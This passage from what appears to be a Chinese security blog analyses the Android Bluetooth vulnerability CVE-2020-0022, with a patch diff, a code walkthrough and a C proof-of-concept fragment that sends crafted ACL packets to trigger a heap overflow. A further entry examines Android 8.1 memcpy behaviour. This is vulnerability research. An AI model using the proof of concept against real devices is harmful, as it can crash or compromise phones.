包格式</h4><p>HCI通过包的方式来传送数据、命令和事件的，所有在主机和主机控制器之间的通信都以包的形式进行。包括每个命令的返回参数都通过特定的事件包来传输。HCI有数据、命令和事件三种类型的包。命令包COMMAND（0x01）只能从主机发往主机控制器，其中数据包是双向的，分为两类：ACL（0x02）、SCO（0x03），而事件包EVENT（0x04）始终是主机控制器发向主机的。主机发出的大多数命令包都会触发主机控制器产生相应的事件包作为响应，在传输过程中会有一个句柄，用于识别主机之间的逻辑通道和控制器，共有三种类型的句柄：连接句柄、逻辑链路句柄和物理链路句柄。</p><p>根据需要，这里只介绍ACL数据包格式，ACL 数据用于主机和控制器之间的非同步数据交换，如播放音乐数据的数据包，格式如下图：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022525.png" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022525.png" alt="img"></a></p><p>字段说明：</p><table><thead><tr><th><strong>字段</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>Handle</strong></td><td>Connection_Handle用于在主控制器上传输数据包或段。</td></tr><tr><td><strong>PB  Flag</strong></td><td>包边界和适应范围。</td></tr><tr><td><strong>BC  Flag</strong></td><td>广播标志。</td></tr><tr><td><strong>Data  Total Length</strong></td><td>以八位位组为单位的数据长度，包含高层协议data。</td></tr></tbody></table><p>其中 PB FLAGS  是我们要注意的  ，设置为 00’b 的时候，代表 Host -&gt; Contoller 的 L2CAP 的首包。设置为 01’b 的时候，代表 Host -&gt; Contoller 或者 Contoller -&gt; Host 的 L2CAP 的续包（中间的）。设置为 10’b 的时候，代表 Contoller -&gt; Host 的 L2CAP 的首包。</p><table><thead><tr><th>字段</th><th>表示</th></tr></thead><tbody><tr><td>00’b -&gt; 0</td><td>Host -&gt; Contoller 的 L2CAP 的首包</td></tr><tr><td>01’b -&gt; 1</td><td>Host -&gt; Contoller 或者 Contoller -&gt; Host 的 L2CAP 的续包</td></tr><tr><td>10’b -&gt; 2</td><td>设置为 10’b 的时候，代表 Contoller -&gt; Host 的 L2CAP 的首包。</td></tr></tbody></table><h3 id="L2CAP-数据包格式"><a href="#L2CAP-数据包格式" class="headerlink" title="L2CAP 数据包格式"></a>L2CAP 数据包格式</h3><p>上面提到了 L2CAP ，那么什么是L2CAP呢？</p><h4 id="分段（Fragmentation）和重组（Reassembly-）"><a href="#分段（Fragmentation）和重组（Reassembly-）" class="headerlink" title="分段（Fragmentation）和重组（Reassembly ）"></a>分段（Fragmentation）和重组（Reassembly ）</h4><p>这里需要提及一下 分段与重组</p><p>分段是将PDU分解成较小的部分，以便从L2CAP传递到较低层。重组是根据从下层传递来的片段重组PDU的过程。分段和重组可以应用于任何L2CAP PDU。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161312.png" title="image-20200214163251779" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161312.png" alt="image-20200214163251779"></a></p><p>我们可以简单把  L2CAP 当成 HCI data payload</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161328.png" title="image-20200214163406198" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161328.png" alt="image-20200214163406198"></a> </p><h4 id="数据包格式"><a href="#数据包格式" class="headerlink" title="数据包格式"></a>数据包格式</h4><p>L2CAP是基于分组的，但也遵循信道传输的通信模型。L2CAP支持的信道有两种：面向连接的信道和面向无连接的信道。在面向连接的信道中，L2CAP数据包的格式如下图所示</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022552" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022552" alt="img"></a></p><p>数据包中每个字段的说明如下所示：</p><table><thead><tr><th><strong>字段</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>Length</strong></td><td>2字节，表示信息有效负载的大小，不包括长度L2CAP头。</td></tr><tr><td><strong>Channel  ID**</strong>（**<strong>CID**</strong>）**</td><td>2字节，用于标识目的信道的终端。通道ID的范围与正在发送数据包的设备相关。</td></tr><tr><td><strong>Information**</strong>（**<strong>Payload**</strong>）**</td><td>信息负载。长度为0到65535字节。</td></tr></tbody></table><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2020-0022漏洞位于HCI层，漏洞补丁代码位于hci/src/packet_fragmenter.cc（以8.1.0_r33为例）中的reassemble_and_dispatch()函数中，该函数是用于数据包分片的重组。对于过长的ACL数据包需要进行包的重组，主要是根据ACL包中的PB Flag标志位进行重组，如果当前是起始部分并且是不完整的，则生成一个部分包（partial_packet）放到map里，等下次收到它的后续部分进行拼装，拼装完毕后就分发出去。详细分析reassemble_and_dispatch()函数如下：</p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>clone 一份代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://android.googlesource.com/platform/system/bt</span><br><span class="line"><span class="built_in">cd</span> bt </span><br><span class="line">checkout 771571</span><br></pre></td></tr></table></figure><p>咱们先看 一眼 patch：</p><p><a href="https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf^!/">https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf%5E%21/</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/hci/src/packet_fragmenter.cc b/hci/src/packet_fragmenter.cc</span><br><span class="line">index 5036ed5..143fc23 100644</span><br><span class="line"><span class="comment">--- a/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="comment">+++ b/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="meta">@@ -221,7 +221,8 @@</span></span><br><span class="line">                  &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">                  &quot;Truncating.&quot;,</span><br><span class="line">                  __func__, partial_packet-&gt;len);</span><br><span class="line"><span class="deletion">-        packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</span></span><br><span class="line"><span class="addition">+        packet-&gt;len =</span></span><br><span class="line"><span class="addition">+            (partial_packet-&gt;len - partial_packet-&gt;offset) + packet-&gt;offset;</span></span><br><span class="line">         projected_offset = partial_packet-&gt;len;</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>将 packet-&gt;len 的值在原本的基础上加上了 packet-&gt;offset</p><h3 id="code-review"><a href="#code-review" class="headerlink" title="code review"></a>code review</h3><p>代码处理逻辑在 <code>reassemble_and_dispatch</code> 函数里：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161342.png" title="image-20200214164211428" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161342.png" alt="image-20200214164211428"></a></p><p>首先读取相关变量， handle 和 acl_length :</p><ul><li><p>handle  相当于链接 seesion</p></li><li><p>acl_length 则为 Data Total Length 这是包括 header + data</p><p>131 行校验 长度是否合法</p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161345.png" title="image-20200214164743418" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161345.png" alt="image-20200214164743418"></a></p><p>133 行 通过 handle 读取 boundary_flag ，就是前文提及的 PB flag</p><p>136 行 判断 PB flag 是否为 2 ，即 是否为 <strong>Contoller -&gt; Host</strong> 的 L2CAP 的首包，如是则进入 if 条件分支</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161349.png" title="image-20200214165424356" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161349.png" alt="image-20200214165424356"></a></p><p>145 的分支则判断 packet 是否已经被处理过</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161354.png" title="image-20200214165740960" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161354.png" alt="image-20200214165740960"></a></p><p>156 行则判断  acl_length 是否正常</p><p>然后紧接着计算 full_length ，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint16_t</span> full_length =</span><br><span class="line">    l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>L2cap_length 也是从 stream 读取的</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161357.png" title="image-20200214165946945" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161357.png" alt="image-20200214165946945"></a></p><p>上面提及了 acl_length为Data Total Length，该data数据域中存放着L2CAP数据包分片（也可能是一个完整的L2CAP数据包） 则 l2cap_length 是一个完整的L2CAP数据包中payload的长度。</p><p>所以 full_length = 完整的L2CAP数据包中的payload的长度 + 一个L2CAP头部长度和一个HCI头部长度</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161401.png" title="image-20200214170805275" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161401.png" alt="image-20200214170805275"></a></p><p>168 行 又是一次数据大小检查</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161404.png" title="image-20200214170947166" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161404.png" alt="image-20200214170947166"></a></p><p>177 行开始，通过检查大小 判断当前 packet 是否还有后续的包，如果没有就直接 <code>callbacks-&gt;reassembled(packet);</code>并返回</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161410.png" title="image-20200214171432668" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161410.png" alt="image-20200214171432668"></a></p><p>如果有后续包，则开始进一步处理</p><ul><li><p>分配一块内存，用来 packet 数据重组</p></li><li><p>设置一些变量，partial_packet-&gt;event 、 partial_packet-&gt;len、partial_packet-&gt;offset</p><p>其中：<code>partial_packet-&gt;len = full_length;</code> 以及<code>partial_packet-&gt;offset = packet-&gt;len;</code></p><p>将partial_packet-&gt;len设置为full_length，将partial_packet-&gt;offset设置为packet-&gt;len即当前头包packet-&gt;data的长度</p></li><li><p>调用memcpy，将头包packet中HCI数据包整体拷贝到partial_packet中</p></li><li><p>更新acl_length为一个完整的L2CAP数据包长度</p></li><li><p>200 行 将partial_packet存放到容器中</p></li><li><p>最后 释放当前头包packet，表示已经处理完第一个packet</p></li></ul><p>当下一个包过来，且不是首包的时候，就会进入到</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161414.png" title="image-20200214171915985" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161414.png" alt="image-20200214171915985"></a></p><p>204 行这个分支</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161418.png" title="image-20200214172003177" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161418.png" alt="image-20200214172003177"></a></p><p>206 行，判断通过 handle 判断当前包是否是一个链路里的，否则 drop</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161423.png" title="image-20200214173502465" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161423.png" alt="image-20200214173502465"></a></p><p>215 行，  设置 packet-&gt;offset 等于 HCI_ACL_PRESMBLE_SIXE 即等于4 ，此时 packet-&gt;offset 就指向了  data 域</p><p>216 行，  开始计算 projected_offset ,等于 partial_packet-&gt;offset 与 (packet-&gt;len - HCI_ACL_PREAMBLE_SIZE) 之和：</p><p>​    此时</p><ul><li>projected_offset为partial_packet-&gt;offset</li><li>(packet-&gt;len - HCI_ACL_PREAMBLE_SIZE) 为 L2CAP数据包分片</li></ul><p>则，projected_offset 为 partial_packet-&gt;offset +  L2CAP数据包分片</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161425.png" title="image-20200214174007323" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161425.png" alt="image-20200214174007323"></a></p><p>接着就是重要的地方了，判断  projected_offset 是否大于 partial_packet-&gt;len</p><p>projected_offset 是刚才求和的结果 ， partial_packet-&gt;len 则  full_lenght </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161429.png" title="image-20200214174315466" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161429.png" alt="image-20200214174315466"></a></p><p>如果 projected_offset  大于 partial_packet-&gt;len 则进行一次减法运算：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161434.png" title="image-20200214174406350" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161434.png" alt="image-20200214174406350"></a></p><p> packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</p><p> projected_offset = partial_packet-&gt;len;</p><p>重新设置  packet-&gt;len 与 projected_offset，packet-&gt;len为partial_packet剩余空间的长度。然后，将projected_offset设置为partial_packet-&gt;len</p><p>如果此时 <code>packet-&gt;len</code> 的结果是一个小的数，那么在</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161439.png" title="image-20200214174600143" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161439.png" alt="image-20200214174600143"></a></p><p>228 行进行拷贝的时候，packet-&gt;len - packet-&gt;offset 就可能为一个负数，当size 为负数，由于memcpy 的参数是无符号的，所以会被强制转换为一个大数，然后造成堆溢出。</p><h2 id="PoC-构建"><a href="#PoC-构建" class="headerlink" title="PoC 构建"></a>PoC 构建</h2><p>PoC 链接可以看着： <a href="https://gist.github.com/leommxj/c9ba42e54faa9629cff5db3b4daeccef">https://gist.github.com/leommxj/c9ba42e54faa9629cff5db3b4daeccef</a></p><ol><li>我们要构建  packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset; 为一个小数，或者干脆就是一个负数</li></ol><p>通过前文分析，我们知道 packet-&gt;len  等于 partial_packet-&gt;len - partial_packet-&gt;offset 相减，partial_packet-&gt;len 为 full_length  -&gt; </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">full_length =</span><br><span class="line">          l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>partial_packet-&gt;offset  为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">partial_packet-&gt;offset = packet-&gt;len;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nCreating a HCI BLE connection...\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nPrepare to send packet\n&quot;</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> datalen = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> _bs_l2cap_len = htobs(datalen + <span class="number">4</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> _bs_cid = htobs(<span class="number">0x0001</span>);</span><br><span class="line"><span class="keyword">uint8_t</span> packet[<span class="number">4</span> + L2CAP_CMD_HDR_SIZE + datalen + <span class="number">11</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;packet[<span class="number">0</span>],&amp;_bs_l2cap_len,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;packet[<span class="number">2</span>],&amp;_bs_cid,<span class="number">2</span>);</span><br><span class="line">l2cap_cmd_hdr* cmd = (l2cap_cmd_hdr*) (packet+ <span class="number">4</span>);</span><br><span class="line">cmd-&gt;code = L2CAP_ECHO_REQ;</span><br><span class="line">cmd-&gt;ident = <span class="number">0x01</span>;</span><br><span class="line">cmd-&gt;len = htobs(datalen);</span><br><span class="line"><span class="built_in">memset</span>(&amp;packet[<span class="number">8</span>], <span class="number">0x99</span>, datalen+<span class="number">11</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending first packet\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> i =<span class="number">0</span> ;</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">8</span> + <span class="number">4</span> ,<span class="number">0x0</span>, <span class="number">8</span> + <span class="number">4</span> ); </span><br><span class="line">i+=<span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending second packet\n&quot;</span>);</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">12</span>,<span class="number">0x1</span>,<span class="number">12</span>);</span><br><span class="line">i+=<span class="number">12</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending third packet\n&quot;</span>);</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">12</span>,<span class="number">0x1</span>,<span class="number">12</span>); </span><br><span class="line">i+=<span class="number">12</span>;</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">11</span>,<span class="number">0x1</span>,<span class="number">11</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nClosing HCI socket...\n&quot;</span>);</span><br><span class="line">close(hci_socket);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nClosing l2cap socket...\n&quot;</span>);</span><br><span class="line">close(l2_sock);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先，整个l2cap 长度为 ： datalen + header 即 30 + 4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">full_length =</span><br><span class="line">          l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>那么此时 full_length 就等于  34 + 4 + 4 等于 42</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">packet-&gt;offset &#x3D; HCI_ACL_PREAMBLE_SIZE;</span><br><span class="line">uint16_t projected_offset &#x3D;</span><br><span class="line">    partial_packet-&gt;offset + (packet-&gt;len - HCI_ACL_PREAMBLE_SIZE);</span><br><span class="line">if (projected_offset &gt;</span><br><span class="line">    partial_packet-&gt;len) &#123;  &#x2F;&#x2F; len stores the expected length</span><br><span class="line">  LOG_WARN(LOG_TAG,</span><br><span class="line">           &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">           &quot;Truncating.&quot;,</span><br><span class="line">           __func__, partial_packet-&gt;len);</span><br><span class="line">  packet-&gt;len &#x3D; partial_packet-&gt;len - partial_packet-&gt;offset;</span><br><span class="line">  projected_offset &#x3D; partial_packet-&gt;len;</span><br></pre></td></tr></table></figure><p>此时 projected_offset = 36 + （11 - 4）</p><p>36 是由 12 + 12 + 12 当最后一个包的时候 partial_packet-&gt;offset 就为 36</p><p>那么此时 projected_offset = 43</p><p>当 42-43 的时候为负数 则  packet-&gt;len 等于 -1</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/MgttHkorVd5UrW1Cnlc5Xw">https://mp.weixin.qq.com/s/MgttHkorVd5UrW1Cnlc5Xw</a></p><p><a href="https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf^!/">https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf%5E%21/</a></p><p> <a href="https://stackoverflow.com/questions/60116790/sending-gap-acl-l2cap-data-packets">https://stackoverflow.com/questions/60116790/sending-gap-acl-l2cap-data-packets</a></p><p><a href="https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/">https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-0022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 8.1 上 memcpy 一点有趣的东西</title>
      <link href="Android-8.1-memcpy-func.html"/>
      <url>Android-8.1-memcpy-func.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天一直在看 CVE-2020-0022 的东西，不清楚的同学可以参考：</p><p><a href="https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/">https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/</a></p><p>代码不长，具体逻辑我就不在这里分析了，总而言之问题就是</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/hci/src/packet_fragmenter.cc b/hci/src/packet_fragmenter.cc</span><br><span class="line">index 5036ed5..143fc23 100644</span><br><span class="line"><span class="comment">--- a/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="comment">+++ b/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="meta">@@ -221,7 +221,8 @@</span></span><br><span class="line">                  &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">                  &quot;Truncating.&quot;,</span><br><span class="line">                  __func__, partial_packet-&gt;len);</span><br><span class="line"><span class="deletion">-        packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</span></span><br><span class="line"><span class="addition">+        packet-&gt;len =</span></span><br><span class="line"><span class="addition">+            (partial_packet-&gt;len - partial_packet-&gt;offset) + packet-&gt;offset;</span></span><br><span class="line">         projected_offset = partial_packet-&gt;len;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>当计算 packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset; 值的时候，可能计算出一个小的数，或者干脆是负数，导致在</p><p><a href="https://user-images.githubusercontent.com/18380453/74593171-84e7f580-5063-11ea-8f65-b8d314131260.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593171-84e7f580-5063-11ea-8f65-b8d314131260.png" alt="image"></a></p><p>后面拷贝的时候， 拷贝一个 负数长度的值，由于 memcpy 参数是无符号的，则导致拷贝一个大数</p><h2 id="Android-8-1-memcpy-引起的一个小bug"><a href="#Android-8-1-memcpy-引起的一个小bug" class="headerlink" title="Android 8.1 memcpy 引起的一个小bug"></a>Android 8.1 memcpy 引起的一个小bug</h2><p>在我和 @<a href="https://github.com/leommxj">leommxj</a> 测试的过程中，遇到一个坑，大致如图：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200216022738.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200216022738.png"></a></p><p>X0 是 dest ，X1是 src， X2是 size ，此时的size 明明是个负数，而且下溢后至少是一个很大的数，但是程序并没有崩溃。</p><h3 id="引起-BUG-的原因"><a href="#引起-BUG-的原因" class="headerlink" title="引起 BUG 的原因"></a>引起 BUG 的原因</h3><p>真的各种猜测不如看代码，所以我们把 libc.so 拿出来看了一下</p><a href="https://user-images.githubusercontent.com/18380453/74593437-49025f80-5066-11ea-89f0-ae9d78ba123f.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593437-49025f80-5066-11ea-89f0-ae9d78ba123f.png" alt="image" style="zoom:150%;" /></a><p>重点在于：</p><p><a href="https://user-images.githubusercontent.com/18380453/74593316-e5c3fd80-5064-11ea-9566-ab65710283b0.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593316-e5c3fd80-5064-11ea-9566-ab65710283b0.png" alt="image"></a></p><p>此时 X0 是dest，Dest 取低位赋值给X9，然后 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD X2, X2 ,X9</span><br></pre></td></tr></table></figure><p>而此时的 X2 是 len，导致他整型上溢出，变成一个小的数字，例如 0xa</p><p><a href="https://user-images.githubusercontent.com/18380453/74593356-405d5980-5065-11ea-9ba9-f3b43e68bf9c.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593356-405d5980-5065-11ea-9ba9-f3b43e68bf9c.png" alt="image"></a></p><p>当进入下图逻辑时</p><a href="https://user-images.githubusercontent.com/18380453/74593369-6682f980-5065-11ea-9271-c425599f69f4.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593369-6682f980-5065-11ea-9271-c425599f69f4.png" alt="image" style="zoom:50%;" /></a><p>此时 X2 为 0xA，进行下面的指令的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUBS            X2, X2, #0x90</span><br><span class="line">B.LS            loc_1C8A8</span><br></pre></td></tr></table></figure><p>由于此时 X2 为 0xA ，小于0x40，所以 此时条件为 小于</p><p><strong>B. LS</strong> 则表示，当小于等于条件成立时候，为真，则跳转到  loc_1C8A8 处代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">loc_1C8A8</span><br><span class="line">LDP             X1, X2, [X4,#-0x40]</span><br><span class="line">STP             X6, X7, [X3,#0x10]</span><br><span class="line">LDP             X6, X7, [X4,#-0x30]</span><br><span class="line">STP             X8, X9, [X3,#0x20]</span><br><span class="line">LDP             X8, X9, [X4,#-0x20]</span><br><span class="line">STP             X10, X11, [X3,#0x30]</span><br><span class="line">LDP             X10, X11, [X4,#-0x10]</span><br><span class="line">STP             X12, X13, [X3,#0x40]</span><br><span class="line">STP             X1, X2, [X5,#-0x40]</span><br><span class="line">STP             X6, X7, [X5,#-0x30]</span><br><span class="line">STP             X8, X9, [X5,#-0x20]</span><br><span class="line">STP             X10, X11, [X5,#-0x10]</span><br><span class="line">RET</span><br><span class="line">; &#125; &#x2F;&#x2F; starts at 1C770</span><br></pre></td></tr></table></figure><p>之后的代码逻辑直接就是 RET ，导致 并没有拷贝过长的内存，导致 crash。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android8.1 </tag>
            
            <tag> memcpy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-18634 分析</title>
      <link href="CVE-2019-18634-analysis.html"/>
      <url>CVE-2019-18634-analysis.html</url>
      
